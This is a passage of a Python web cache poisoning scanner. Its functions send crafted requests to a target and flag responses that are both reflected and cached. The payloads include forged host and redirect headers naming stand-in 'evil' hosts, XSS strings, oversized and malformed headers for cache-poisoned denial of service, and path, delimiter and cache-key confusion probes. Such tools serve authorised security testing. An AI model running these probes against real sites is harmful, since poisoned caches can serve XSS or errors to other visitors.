        findings.append({
            "vector_id": "V18", "name": "Canonical Tag Hijacking",
            "header": hname, "status": r.status_code,
            "baseline_canonicals": baseline[:3],
            "hijacked_canonicals": canonicals[:3],
            "reflected_in_canonical": reflected,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "canonical rewritten + cached" if vuln else "",
        })
    return findings


def test_open_redirect_chain(url):
    findings = []
    for hname in REDIRECT_HEADERS:
        token = random_token(10)
        evil = "https://evil-" + token + ".example.com/"
        r = fetch(url, headers={hname: evil})
        if not r:
            continue
        redirect = 300 <= r.status_code < 400
        location = r.headers.get("location", "")
        loc_reflect = token in location
        cacheable, _ = is_cacheable(r)
        vuln = redirect and loc_reflect and cacheable
        findings.append({
            "vector_id": "V19", "name": "Open Redirect Chain",
            "header": hname, "sent_value": evil,
            "status": r.status_code, "redirect": redirect,
            "location": location[:150], "location_reflected": loc_reflect,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "302 with attacker host cached" if vuln else "",
        })
    return findings


def test_stored_xss_via_cache(url):
    findings = []
    payloads = [
        ("script", "<script>alert(1)</script>"),
        ("img",    "<img src=x onerror=alert(1)>"),
        ("svg",    "<svg onload=alert(1)>"),
    ]
    for label, payload in payloads:
        sep = "&" if "?" in url else "?"
        u = url + sep + "q=" + requests.utils.quote(payload, safe="")
        r = fetch(u)
        if r:
            body = r.text if r.content else ""
            reflected = payload in body
            cacheable, _ = is_cacheable(r)
            vuln = reflected and cacheable
            findings.append({
                "vector_id": "V20",
                "name": "Stored XSS via Cache (" + label + " in query)",
                "injection": "query", "payload": payload,
                "tested_url": u, "status": r.status_code,
                "reflected": reflected, "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "vulnerable": vuln,
                "note": "XSS payload cached -> stored XSS" if vuln else "",
            })
        token = random_token(8)
        hdr = "evil-" + token + ".example.com/" + payload
        r2 = fetch(url, headers={"X-Forwarded-Host": hdr})
        if r2:
            body2 = r2.text if r2.content else ""
            reflected2 = payload in body2
            cacheable2, _ = is_cacheable(r2)
            vuln2 = reflected2 and cacheable2
            findings.append({
                "vector_id": "V20",
                "name": "Stored XSS via Cache (" + label + " in XFH)",
                "injection": "X-Forwarded-Host", "payload": payload,
                "status": r2.status_code, "reflected": reflected2,
                "cacheable": cacheable2,
                "cf_cache_status": r2.headers.get("cf-cache-status", ""),
                "vulnerable": vuln2,
                "note": "XSS via header cached -> stored XSS" if vuln2 else "",
            })
    return findings


# ============================================================
#  V21-V30 FUNCTIONS
# ============================================================

def test_hho_dos(url):
    findings = []
    for size in HHO_SIZES:
        value = "A" * size
        r = fetch(url, headers={HHO_HEADER_NAME: value})
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        is_error = r.status_code >= 400
        vuln = is_error and cacheable
        findings.append({
            "vector_id": "V21", "name": "HTTP Header Oversize (HHO) DoS",
            "header_size": size, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "oversized header -> error cached" if vuln else "",
        })
    return findings


def test_hmc_dos(url):
    findings = []
    p = urlparse(url)
    use_ssl = p.scheme == "https"
    host = p.netloc.split(":")[0]
    path = p.path or "/"
    if p.query:
        path += "?" + p.query

    for hname, hval in HMC_HEADERS.items():
        invalid_chars = any(c in hval for c in ["\r", "\n", "\x00"])
        leading_ws = hval[:1] in (" ", "\t") if hval else False
        has_invalid = invalid_chars or leading_ws

        r = None
        cf = ""
        age = ""

        if not has_invalid:
            try:
                r = fetch(url, headers={hname: hval})
            except Exception:
                r = None

        if r is not None:
            cacheable, _ = is_cacheable(r)
            status = r.status_code
            cf = r.headers.get("cf-cache-status", "")
            age = r.headers.get("age", "")
            note = "sent via requests"
        else:
            raw = fetch_raw_headers(host, path, {hname: hval}, use_ssl=use_ssl)
            status = 0
            cacheable = False
            note = "sent via raw socket"
            if raw:
                first = raw.split("\r\n", 1)[0]
                try:
                    status = int(first.split()[1])
                except Exception:
                    status = 0

        is_error = status >= 400
        vuln = is_error and cacheable
        findings.append({
            "vector_id": "V22",
            "name": "HTTP Meta Character (HMC) DoS",
            "header": hname,
            "value_preview": repr(hval)[:60],
            "status": status,
            "cacheable": cacheable,
            "cf_cache_status": cf,
            "age": age,
            "vulnerable": vuln,
            "note": note,
        })
    return findings


def test_hmo_dos(url):
    findings = []
    for method in HMO_METHODS:
        r = fetch(url, headers={"X-HTTP-Method-Override": method})
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        is_error = r.status_code >= 400
        vuln = is_error and cacheable
        findings.append({
            "vector_id": "V23", "name": "HTTP Method Override (HMO) DoS",
            "override_method": method, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "method override -> error cached" if vuln else "",
        })
    return findings


def test_cpdos(url):
    findings = []
    for hname, hval in CPDOS_HEADERS:
        r = fetch(url, headers={hname: hval})
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        is_error = r.status_code >= 400
        vuln = is_error and cacheable
        findings.append({
            "vector_id": "V24", "name": "Cache-Poisoned DoS (CPDoS)",
            "header": hname, "value_preview": str(hval)[:40],
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "malformed value -> error cached" if vuln else "",
        })
    return findings


def test_wrong_port_reflection(url):
    findings = []
    for port in WRONG_PORTS:
        r = fetch(url, headers={"X-Forwarded-Port": port})
        if not r:
            continue
        location = r.headers.get("location", "")
        port_reflected = port in location
        cacheable, _ = is_cacheable(r)
        redirect = 300 <= r.status_code < 400
        vuln = port_reflected and cacheable and redirect
        findings.append({
            "vector_id": "V25", "name": "Wrong Port Reflection",
            "port": port, "status": r.status_code,
            "redirect": redirect, "location": location[:120],
            "port_reflected": port_reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "wrong port cached in redirect" if vuln else "",
        })
    return findings


def test_scheme_downgrade(url):
    findings = []
    for hname, hval in SCHEME_DOWNGRADE_HEADERS:
        r = fetch(url, headers={hname: hval})
        if not r:
            continue
        location = r.headers.get("location", "")
        downgrade = "http://" in location.lower() and hval in ("http", "ftp", "ws")
        cacheable, _ = is_cacheable(r)
        redirect = 300 <= r.status_code < 400
        vuln = downgrade and cacheable and redirect
        findings.append({
            "vector_id": "V26", "name": "Scheme Downgrade",
            "header": hname, "value": hval, "status": r.status_code,
            "redirect": redirect, "location": location[:120],
            "downgrade_detected": downgrade, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "scheme downgrade redirect cached" if vuln else "",
        })
    return findings


def test_routing_override(url):
    findings = []
    for hname, path in ROUTING_OVERRIDE_HEADERS:
        r = fetch(url, headers={hname: path})
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        accessible = r.status_code in (200, 201)
        vuln = accessible and cacheable
        findings.append({
            "vector_id": "V27", "name": "Routing Override",
            "header": hname, "override_path": path,
            "status": r.status_code, "accessible": accessible,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "internal path accessible + cached" if vuln else "",
        })
    return findings


def test_parameter_pollution(url):
    findings = []
    for name, builder in POLLUTION_PROBES:
        try:
            u = builder(url)
        except Exception:
            continue
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        findings.append({
            "vector_id": "V28", "name": "Parameter Pollution",
            "variant": name, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": cacheable,
            "note": "duplicate params cached (cache vs origin may differ)"
                    if cacheable else "",
        })
    return findings


def test_cache_key_confusion(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for name, transform in CACHE_KEY_PROBES:
        try:
            new_path = transform(base_path)
        except Exception:
            continue
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V29", "name": "Cache-Key Confusion",
            "variant": name, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "cache serves same object for transformed key"
                    if vuln else "",
        })
    return findings


def test_vary_abuse(url):
    findings = []
    r = fetch(url)
    if not r:
        return findings
    vary_raw = r.headers.get("vary", "")
    parsed = [v.strip().lower() for v in vary_raw.split(",") if v.strip()]
    cacheable, _ = is_cacheable(r)

    if "user-agent" in parsed:
        token = "Mozilla/5.0 (Poison; " + random_token(8) + ")"
        r2 = fetch(url, headers={"User-Agent": token})
        if r2:
            reflected = check_reflection(r2, token)
            cacheable2, _ = is_cacheable(r2)
            findings.append({
                "vector_id": "V30", "name": "Vary Header Abuse (User-Agent)",
                "vary_value": vary_raw, "status": r2.status_code,
                "reflected": reflected, "cacheable": cacheable2,
                "cf_cache_status": r2.headers.get("cf-cache-status", ""),
                "vulnerable": reflected and cacheable2,
                "note": "User-Agent in Vary but reflected + cached"
                        if (reflected and cacheable2) else "",
            })

    for risky in VARY_RISKY_HEADERS:
        if risky.lower() not in parsed and cacheable:
            findings.append({
                "vector_id": "V30",
                "name": "Vary Header Abuse (missing: " + risky + ")",
                "vary_value": vary_raw, "status": r.status_code,
                "missing_header": risky, "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "vulnerable": True,
                "note": "cacheable response but " + risky +
                        " not in Vary -> abuse possible",
            })

    if not findings:
        findings.append({
            "vector_id": "V30", "name": "Vary Header Abuse",
            "vary_value": vary_raw or "(none)", "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": False,
            "note": "no Vary abuse detected",
        })
    return findings


# ============================================================
#  V31-V50 FUNCTIONS
# ============================================================

def test_large_header_poisoning(url):
    findings = []
    for hname in LARGE_HEADER_NAMES:
        for size in LARGE_HEADER_SIZES:
            value = "A" * size
            r = fetch(url, headers={hname: value})
            if not r:
                continue
            cacheable, _ = is_cacheable(r)
            is_error = r.status_code >= 400
            vuln = is_error and cacheable
            findings.append({
                "vector_id": "V31", "name": "Large Header Poisoning",
                "header": hname, "size": size,
                "status": r.status_code, "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "age": r.headers.get("age", ""),
                "vulnerable": vuln,
                "note": "large header -> error cached" if vuln else "",
            })
    return findings


def test_invalid_encoding(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for enc in INVALID_ENCODINGS:
        new_path = base_path + enc
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code in (200, 201, 204)
        findings.append({
            "vector_id": "V32", "name": "Invalid Encoding",
            "encoding": enc, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "invalid encoding accepted + cached" if vuln else "",
        })
    return findings


def test_semicolon_delimiter(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for probe in SEMICOLON_PROBES:
        new_path = base_path + probe
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V33", "name": "Semicolon Delimiter",
            "probe": probe, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "semicolon path cached - cache/origin may disagree"
                    if vuln else "",
        })
    return findings


def test_dot_delimiter(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for ext in DOT_PROBES:
        new_path = base_path + ext
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        ct = r.headers.get("content-type", "").lower()
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V34", "name": "Dot Delimiter",
            "extension": ext, "tested_url": u,
            "status": r.status_code, "content_type": ct,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "dot extension cached with format switch" if vuln else "",
        })
    return findings


def test_null_byte_truncation(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for probe in NULL_BYTE_PROBES:
        new_path = base_path + probe
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code in (200, 201)
        findings.append({
            "vector_id": "V35", "name": "Null Byte Truncation",
            "probe": probe, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "null byte truncation cached" if vuln else "",
        })
    return findings


def test_newline_byte(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for probe in NEWLINE_PROBES:
        new_path = base_path + probe
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code in (200, 201, 204)
        findings.append({
            "vector_id": "V36", "name": "Newline Byte",
            "probe": probe, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "newline byte accepted + cached" if vuln else "",
        })
    return findings


def test_static_extension_abuse(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for ext in STATIC_EXT_ABUSE:
        new_path = base_path + ext
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        ct = r.headers.get("content-type", "").lower()
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V37", "name": "Static Extension Abuse",
            "extension": ext, "tested_url": u,
            "status": r.status_code, "content_type": ct,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "dynamic content cached as static" if vuln else "",
        })
    return findings


def test_cache_deception_paths(url):
    findings = []
    p = urlparse(url)
    base_path = (p.path or "/").lstrip("/")
    origin = p.scheme + "://" + p.netloc
    for tmpl in CACHE_DECEPTION_PATHS:
        try:
            rel = tmpl.format(path=base_path)
        except Exception:
            continue
        u = origin + "/" + rel
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        ct = r.headers.get("content-type", "").lower()
        vuln = cacheable and r.status_code == 200 and "html" in ct
        findings.append({
            "vector_id": "V38", "name": "Cache Deception",
            "tested_url": u, "status": r.status_code,
            "content_type": ct, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "dynamic HTML cached under static-looking URL" if vuln else "",
        })
    return findings


def test_path_confusion(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for probe in PATH_CONFUSION_PROBES:
        new_path = base_path.rstrip("/") + probe
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V39", "name": "Path Confusion",
            "probe": probe, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "path parsed differently by cache vs origin" if vuln else "",
        })
    return findings


def test_delimiter_discrepancy(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for delim in DELIMITER_DISCREPANCY:
        new_path = base_path + delim + "x"
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V40", "name": "Delimiter Discrepancy",
            "delimiter": delim, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cache and origin may parse delimiter differently"
                    if vuln else "",
        })
    return findings


def test_normalization_discrepancy(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for name, transform in NORMALIZATION_DISCREPANCY:
        try:
            new_path = transform(base_path)
        except Exception:
            continue
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V41", "name": "Normalization Discrepancy",
            "variant": name, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cache normalized URL that origin did not"
                    if vuln else "",
        })
    return findings


def test_cacheable_4xx(url):
    findings = []
    origin = urlparse(url).scheme + "://" + urlparse(url).netloc
    for method, tmpl, desc in CACHEABLE_ERROR_PROBES:
        token = random_token(8)
        path = tmpl.format(token)
        u = origin + path
        try:
            r = requests.request(method, u, timeout=15, verify=False,
                                 allow_redirects=False)
        except requests.RequestException:
            continue
        cacheable, _ = is_cacheable(r)
        is_4xx = 400 <= r.status_code < 500
        vuln = is_4xx and cacheable
        findings.append({
            "vector_id": "V42", "name": "Cacheable 4xx Error",
            "method": method, "description": desc,
            "tested_url": u, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "4xx response is cached (DoS possible)" if vuln else "",
        })
    return findings


def test_cf_4xx_cacheable(url):
    findings = []
    origin = urlparse(url).scheme + "://" + urlparse(url).netloc
    for probe in CF_4XX_PROBES:
        method, path_tmpl = probe.split(" ", 1)
        token = random_token(8)
        path = path_tmpl.replace("{}", token)
        u = origin + path
        try:
            r = requests.request(method, u, timeout=15, verify=False,
                                 allow_redirects=False)
        except requests.RequestException:
            continue
        cacheable, _ = is_cacheable(r)
        is_4xx = 400 <= r.status_code < 500
        vuln = is_4xx and cacheable
        findings.append({
            "vector_id": "V43", "name": "Cloudflare 4xx Cacheable",
            "tested_url": u, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "CF cached 4xx (DoS)" if vuln else "",
        })
    return findings


def test_ats_fragment_poisoning(url):
    findings = []
    for frag in ATS_FRAGMENT_PROBES:
        u = url + frag
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V44", "name": "ATS Fragment Poisoning",
            "fragment": frag, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "fragment may confuse ATS cache key" if vuln else "",
        })
    return findings


def test_fastly_host_poisoning(url):
    findings = []
    for hname, tmpl in FASTLY_HOST_PROBES:
        token = random_token(10)
        value = tmpl.format(t=token) if "{t}" in tmpl else tmpl
        r = fetch(url, headers={hname: value})
        if not r:
            continue
        reflected = check_reflection(r, token) if "{t}" in tmpl else False
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V45", "name": "Fastly Host Poisoning",
            "header": hname, "value": value,
            "status": r.status_code, "reflected": reflected,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "Fastly-style header reflected + cached" if vuln else "",
        })
    return findings


def test_request_body_poisoning(url):
    findings = []
    for body in BODY_POISON_BODIES:
        try:
            r = requests.get(url, data=body, timeout=15, verify=False,
                             allow_redirects=False)
        except requests.RequestException:
            continue
        cacheable, _ = is_cacheable(r)
        body_in_resp = False
        try:
            if r.content and body in r.text:
                body_in_resp = True
        except Exception:
            pass
        vuln = body_in_resp and cacheable
        findings.append({
            "vector_id": "V46", "name": "Request Body Poisoning",
            "body": body, "status": r.status_code,
            "body_reflected": body_in_resp, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "GET body reflected + cached" if vuln else "",
        })
    return findings


def test_header_bruteforce(url):
    findings = []
    for hname in HEADER_BRUTEFORCE:
        token = random_token(10)
        value = "brute-" + token + ".example.com"
        r = fetch(url, headers={hname: value})
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        if reflected or cacheable:
            vuln = reflected and cacheable
            findings.append({
                "vector_id": "V47", "name": "Header Bruteforce",
                "header": hname, "value": value,
                "status": r.status_code, "reflected": reflected,
                "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "vulnerable": vuln,
                "note": "unkeyed header reflected + cached"
                        if vuln else "interesting (no reflection)",
            })
    return findings


def test_cdn_normalization_bug(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    for name, transform in CDN_NORMALIZATION_PROBES:
        try:
            new_path = transform(base_path)
        except Exception:
            continue
        u = urlunparse((p.scheme, p.netloc, new_path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V48", "name": "CDN Normalization Bug",
            "variant": name, "tested_url": u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "CDN normalization mismatch" if vuln else "",
        })
    return findings


def test_cache_key_discrepancy(url):
    findings = []
    for name, transform in CACHE_KEY_DISCREPANCY:
        try:
            new_u = transform(url)
        except Exception:
            continue
        r = fetch(new_u)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V49", "name": "Cache-Key Discrepancy",
            "variant": name, "tested_url": new_u,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cache-key computed differently than origin parse"
                    if vuln else "",
        })
    return findings


def test_edge_case_cache_poisoning(url):
    findings = []
    for name, headers in EDGE_CASE_PROBES:
        r = fetch(url, headers=headers)
        if not r:
            continue
        cacheable, _ = is_cacheable(r)
        vary = r.headers.get("vary", "").lower()
        vuln = cacheable and "accept-encoding" not in vary
        findings.append({
            "vector_id": "V50", "name": "Edge Case Cache Poisoning",
            "variant": name, "status": r.status_code,
            "vary": vary, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "response cached without proper Vary" if vuln else "",
        })
    return findings


# ============================================================
#  V51-V80 FUNCTIONS
# ============================================================

def test_content_type_confusion(url):
    findings = []
    for ctype, label in CONTENT_TYPE_PROBES:
        r = fetch(url, headers={"Content-Type": ctype})
        if not r: continue
        cacheable, _ = is_cacheable(r)
        resp_ct = r.headers.get("content-type", "")
        reflected = ctype.lower() in resp_ct.lower() if ctype else False
        vuln = cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V51", "name": "Content-Type Confusion",
            "content_type": ctype, "label": label,
            "status": r.status_code, "response_content_type": resp_ct,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cached with attacker content-type" if vuln else "",
        })
    return findings


def test_accept_encoding_abuse(url):
    findings = []
    for enc in ACCEPT_ENCODING_PROBES:
        r = fetch(url, headers={"Accept-Encoding": enc})
        if not r: continue
        cacheable, _ = is_cacheable(r)
        vary = r.headers.get("vary", "").lower()
        has_vary_ae = "accept-encoding" in vary
        vuln = cacheable and not has_vary_ae and r.status_code == 200
        findings.append({
            "vector_id": "V52", "name": "Accept-Encoding Abuse",
            "accept_encoding": enc, "status": r.status_code,
            "vary": vary, "has_vary_ae": has_vary_ae, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cached without Vary: Accept-Encoding" if vuln else "",
        })
    return findings


def test_accept_language_poisoning(url):
    findings = []
    for lang in ACCEPT_LANGUAGE_PROBES:
        token = random_token(8)
        value = lang.replace("{token}", token)
        r = fetch(url, headers={"Accept-Language": value})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vary = r.headers.get("vary", "").lower()
        has_vary_al = "accept-language" in vary
        vuln = cacheable and not has_vary_al and r.status_code == 200
        findings.append({
            "vector_id": "V53", "name": "Accept-Language Poisoning",
            "lang_value": value, "status": r.status_code,
            "reflected": reflected, "vary": vary,
            "has_vary_al": has_vary_al, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "no Vary: Accept-Language on cached response" if vuln else "",
        })
    return findings


def test_user_agent_poisoning(url):
    findings = []
    for ua_tmpl in USER_AGENT_PROBES:
        token = random_token(8)
        ua = ua_tmpl.replace("{token}", token)
        r = fetch(url, headers={"User-Agent": ua})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vary = r.headers.get("vary", "").lower()
        has_vary_ua = "user-agent" in vary
        vuln = (reflected or not has_vary_ua) and cacheable and r.status_code == 200
        findings.append({
            "vector_id": "V54", "name": "User-Agent Poisoning",
            "user_agent": ua[:80], "status": r.status_code,
            "reflected": reflected, "vary": vary,
            "has_vary_ua": has_vary_ua, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "UA reflected or cached without Vary: User-Agent" if vuln else "",
        })
    return findings


def test_referer_poisoning(url):
    findings = []
    for ref_tmpl in REFERER_PROBES:
        token = random_token(8)
        ref = ref_tmpl.replace("{token}", token)
        r = fetch(url, headers={"Referer": ref})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V55", "name": "Referer Poisoning",
            "referer": ref[:100], "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "Referer reflected + cached (XSS possible)" if vuln else "",
        })
    return findings


def test_cookie_poisoning_advanced(url):
    findings = []
    for cname, cval_tmpl in COOKIE_POISON_PROBES:
        token = random_token(8)
        cval = cval_tmpl.replace("{token}", token)
        r = fetch(url, headers={"Cookie": cname + "=" + cval})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vary = r.headers.get("vary", "").lower()
        has_vary_cookie = "cookie" in vary
        vuln = cacheable and not has_vary_cookie and r.status_code == 200
        findings.append({
            "vector_id": "V56", "name": "Cookie Poisoning",
            "cookie": cname, "value": cval[:60],
            "status": r.status_code, "reflected": reflected,
            "vary": vary, "has_vary_cookie": has_vary_cookie,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "cached without Vary: Cookie" if vuln else "",
        })
    return findings


def test_host_header_poisoning(url):
    findings = []
    for host_tmpl in HOST_HEADER_PROBES:
        token = random_token(8)
        host = host_tmpl.replace("{token}", token)
        try:
            r = requests.get(url, headers={"Host": host}, timeout=15,
                             verify=False, allow_redirects=False)
        except Exception:
            continue
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V57", "name": "Host Header Poisoning",
            "host_value": host, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "Host reflected + cached" if vuln else "",
        })
    return findings


def test_xff_poisoning(url):
    findings = []
    for xff_tmpl in XFF_PROBES:
        token = random_token(8)
        xff = xff_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Forwarded-For": xff})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V58", "name": "X-Forwarded-For Poisoning",
            "xff_value": xff, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "XFF reflected + cached" if vuln else "",
        })
    return findings


def test_xfp_poisoning(url):
    findings = []
    for scheme in XFP_PROBES:
        r = fetch(url, headers={"X-Forwarded-Proto": scheme})
        if not r: continue
        location = r.headers.get("location", "")
        redirect = 300 <= r.status_code < 400
        cacheable, _ = is_cacheable(r)
        downgrade = "http://" in location.lower() and scheme == "http"
        vuln = cacheable and (downgrade or
                              (redirect and "http://" in location.lower()))
        findings.append({
            "vector_id": "V59", "name": "X-Forwarded-Proto Poisoning",
            "scheme": scheme, "status": r.status_code,
            "redirect": redirect, "location": location[:120],
